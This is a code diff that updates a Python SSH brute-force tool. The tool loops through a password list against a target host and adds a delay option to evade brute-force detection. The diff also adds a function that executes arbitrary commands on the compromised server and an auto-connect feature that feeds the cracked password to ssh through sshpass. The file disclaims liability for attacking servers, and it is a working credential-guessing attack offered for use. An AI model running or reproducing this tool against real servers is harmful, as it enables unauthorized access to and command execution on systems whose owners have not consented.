@@ -10,7 +10,7 @@
         I am not liable for attacking / bruteforcing ssh servers using this script.
 
     NOTE:
-        --connect option only works on linux. 
+        --connect option only works on linux.
 
     DEPENDENCIES:
         sshpass
@@ -57,14 +57,18 @@ def is_ssh_open(hostname, username, password, port, delay):
 
     except socket.timeout:
 
-        print('%s Host: %s is unreachable on port %s: Session timed out.' % (FAILED, hostname, port))
+        print('%s Target host is unreachable. Session timed out.' % (FAILED))
+        return False
+
+    except socket.gaierror:
+        print('%s Unable to find target host.' % (FAILED))
         return False
 
     # Failed Authentication
 
     except paramiko.AuthenticationException as err:
 
-        print('%s SSH to port %s on %s: %s\n%s Password: %s' % (FAILED, port, hostname, err, FAILED, password))
+        print('%s %s to target host on port %s' % (FAILED, err, port))
         return False
 
     # Retry with delay if detected
@@ -86,8 +90,88 @@ def is_ssh_open(hostname, username, password, port, delay):
     else:
 
         # Connection established to ssh
-        print('%s SSH to port %s on %s Connection Successful.\n%s Password: %s' % (SUCCESS, port, hostname, SUCCESS, password))
+        print('%s Connection Successful to target host on port %s.' % (SUCCESS, port))
         return True
+
+
+def ssh_execute(hostname, username, password, port, command):
+
+    # Execute a command to a server
+    ssh = paramiko.SSHClient()
+
+    try:
+        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+        ssh.connect(hostname=hostname, username=username, password=password, port=port, timeout=1)
+        stdin, stdout, stderr = ssh.exec_command(command)
+
+    except:
+        pass
+
+    else:
+        output = stdout.readlines()
+        print('%s Command Executed: %s' % (SUCCESS, command))
+        return '\n' + '\r'.join(output)
+
+
+def open_passfile(host, username, password_file, port, delay):
+
+    try:
+        with open(password_file, 'r') as passfile:
+
+            print('%s Connecting to ssh server.. ' % (WORKING))
+
+            # perform brute force
+            for password in passfile:
+
+                password = password.strip()
+
+                if is_ssh_open(host, username, password, port, delay):
+
+                    password_found = password
+
+                    passfile.close()
+
+                    return password_found
+
+    except FileNotFoundError:
+        print('%s %s not found. Terminating script..' % (FAILED, password_file))
+
+
+def auto_connect(username, password, port, host):
+
+    os = get_os()
+
+    if os == "Windows":
+
+        print('%s ERROR: Auto Connect feature not supported on Windows platform.' % FAILED)
+        sys.exit(0)
+
+    if os == "Linux":
+
+        # Check if sshpass is installed
+        check_sshpass = subprocess.call(
+            [
+                '/bin/bash',
+                '-c',
+                "dpkg -l | grep sshpass"
+            ]
+        )
+
+        if check_sshpass == 1:
+            print('%s ERROR: Unable to connect to SSH. sshpass package not found.')
+            sys.exit(0)
+
+        if check_sshpass == 0:
+
+            port = str(port)
+
+            subprocess.call(
+                [
+                    '/bin/bash',
+                    '-c',
+                    "sshpass -p \'%s\' ssh -p %s %s@%s" % (password, port, username, host)
+                ]
+            )
 
 
 def main():
@@ -95,7 +179,7 @@ def main():
     # Create parser
 
     parser = argparse.ArgumentParser(
-        description='A Simple python SSH bruteforce script',
+        description='A Simple python SSH bruteforce script.',
         allow_abbrev=False
     )
 
@@ -103,21 +187,14 @@ def main():
         '-H', '--host',
         metavar='',
         required=True,
-        help='IP address or Hostname of SSH server to bruteforce.'
-    )
-
-    parser.add_argument(
-        '-P', '--passwdlist',
-        metavar='',
-        required=True,
-        help='Pass as argument the file.txt file that contain lists of passwords.'
+        help='IP address or Hostname of SSH server to authenticate.'
     )
 
     parser.add_argument(
         '-u', '--username',
         metavar='',
         required=True,
-        help='username. EX: <username>@1.1.1.1'
+        help='username. EX: [username]@1.1.1.1'
     )
 
     parser.add_argument(
@@ -132,31 +209,49 @@ def main():
         help='If the server detected a bruteforcer, adds a delay timeout 4 as default fastest 1 is the slowest'
     )
 
-    parser.add_argument(
+    # Group parser for password authentication
+
+    group_pass = parser.add_mutually_exclusive_group(
+        required=True
+    )
+
+    group_pass.add_argument(
+        '-L', '--passwordlist',
+        metavar='',
+        help='Pass a file.txt that contain lists of passwords.'
+    )
+
+    group_pass.add_argument(
+        '-P', '--password',
+        metavar='',
+        help='Pass a password as argument to authenticate in ssh.'
+    )
+
+    # Group parser for action
+
+    group_action = parser.add_mutually_exclusive_group()
+
+    group_action.add_argument(
+        '-e', '--execute',
+        metavar='',
+        help='Execute a command to the server. Must be enclosed as string and used alongside with --password.'
+    )
+
+    group_action.add_argument(
         '-c', '--connect',
         action='store_true',
-        help='Auto connect to SSH after the password is found.'
+        help='Auto connect to SSH if the password is specified or found in the password list.'
+
     )
 
     args = parser.parse_args()
 
-    # Initialize password found
-    password_found = None
-
-    # Parse arguments
-    username = args.username
-    host = args.host
-    passwd_list = args.passwdlist
-
-    # Default values
-    port = 22
-
-    if args.port:
-        port = int(args.port)
-
-    # Timeout if detected by server
-    if args.timeout == None:
+    # Timeout default
+    if args.timeout is None:
         delay = 1
+
+    # If timeout param is called and set
+    # This will only trigger if a server detects bruteforce
 
     # 1 minute timeout
     elif args.timeout == '4':
@@ -172,68 +267,58 @@ def main():
 
     # 1 hour timeout
     elif args.timeout == '1':
-        delay = 3600
+        delay = 2700
 
     else:
         print('%s Error: Timeout must be 1 - 4.' % (FAILED))
         sys.exit(1)
 
-    # Read the passwordlist
-    try:
-        with open(passwd_list, 'r') as passfile:
+    # Parse arguments
+    username = args.username
+    host = args.host
+    passwd_list = args.passwordlist
+    passwd = args.password
+    connection = args.connect
+    command = args.execute
 
-            print('%s Starting bruteforce.. ' % (WORKING))
+    # Default values
+    port = 22
 
-            # perform brute force
-            for password in passfile:
+    # Check if port is specified
+    if args.port:
+        port = int(args.port)
 
-                password = password.strip()
+    # Initialize password found
+    password_found = None
 
-                if is_ssh_open(host, username, password, port, delay):
-                    password_found = password
-                    break
+    # Execute if --password option is used
 
-        passfile.close()
+    if passwd:
 
-    except FileNotFoundError:
-        print('%s %s not found. Terminating script..' % (FAILED, passwd_list))
+        is_ssh_open(host, username, passwd, port, delay)
 
-    # Connect to ssh using sshpass
-    if args.connect and password_found:
+        if command:
 
-        os = get_os()
+            output = ssh_execute(host, username, passwd, port, command)
 
-        if os == "Windows":
+            print(output)
 
-            print('%s ERROR: Auto Connect feature not supported on Windows platform.' % FAILED)
-            sys.exit(0)
+        # Connect to ssh using sshpass if --connect is specified
+        if connection and passwd:
 
-        if os == "Linux":
+            auto_connect(username, passwd, port, host)
 
-            # Check if sshpass is installed
-            check_sshpass = subprocess.call(
-                [
-                    '/bin/bash',
-                    '-c',
-                    "dpkg -l | grep sshpass"
-                ]
-            )
+    # Execute if --passwordlist option is used
 
-            if check_sshpass == 1:
-                print('%s ERROR: Unable to connect to SSH. sshpass package not found.')
-                sys.exit(0)
+    if passwd_list:
 
-            if check_sshpass == 0:
+        # Read the passwordlist using --passwordlist option
+        password_found = open_passfile(host, username, passwd_list, port, delay)
 
-                port = str(port)
+        # Connect to ssh using sshpass if --connect is specified
+        if connection and password_found:
 
-                subprocess.call(
-                    [
-                        '/bin/bash',
-                        '-c',
-                        "sshpass -p \'%s\' ssh -p %s %s@%s" % (password_found, port, username, host)
-                    ]
-                )
+            auto_connect(username, password_found, port, host)
 
 
 if __name__ == '__main__':
